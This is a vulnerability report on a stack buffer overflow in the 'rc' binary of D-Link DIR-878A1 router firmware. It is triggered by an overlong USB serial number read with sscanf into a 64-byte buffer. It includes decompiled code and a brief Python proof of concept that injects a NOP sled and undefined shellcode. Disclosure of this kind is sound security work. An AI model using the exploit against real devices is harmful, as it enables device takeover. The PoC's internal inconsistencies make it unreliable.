# Buffer Overflow Vulnerability

1. Vulnerability Overview

| **Field**            | **Details**                                            |
| -------------------- | ------------------------------------------------------ |
| Affected Product     | D-Link DIR-878A1 Router                                |
| Firmware Version     | **FW101B04.bin** (other versions require verification) |
| Vulnerability Type   | **Stack Buffer Overflow**                              |
| Vulnerable Component | `rc` binary (USB storage handling module)              |
| Prerequisites        | Requires physical access or control over a USB device  |

2. Exploitation Path

```c
// rc
int __fastcall sub_4500A8(int a1, int a2, int a3)
{
  ...
  _BYTE v17[64]; // [sp+234h] [-84h] BYREF
  ...
  sprintf(v10, "/proc/scsi/usb-storage/%d", a1);
  v6 = fopen(v10, "r");
  if ( v6 )
  {
    while ( fgets(v11, 128, v6) )
    {
      if ( strstr(v11, "Serial Number:") )
        sscanf(v11, "Serial Number: %s", v17);
    }
    ...
}
```

3. **Vulnerable Binary:** `rc`.

4. 0-Day Buffer Overflow Exploitation Path: In `rc`, line 14: `sscanf(v11, "Serial Number: %s", v17)` reads input from buffer `v11`, which is filled via line 11: `fgets(v11, 128, v6)`, allowing a maximum of 127 bytes. The target buffer `v17` is declared as `_BYTE v17[64]`, with a capacity of 64 bytes, leading to a stack buffer overflow vulnerability.
5. Proof of Concept (PoC) for Reproducing the Vulnerability:

```python
# Generate an overlong serial number (120 bytes)
malicious_serial = "A"*100 + "\x90\x90\x90\x90" + shellcode

# Create a simulated USB device information
with open("/proc/scsi/usb-storage/0", "w") as f:
    f.write(f"Serial Number: {malicious_serial}\n")
```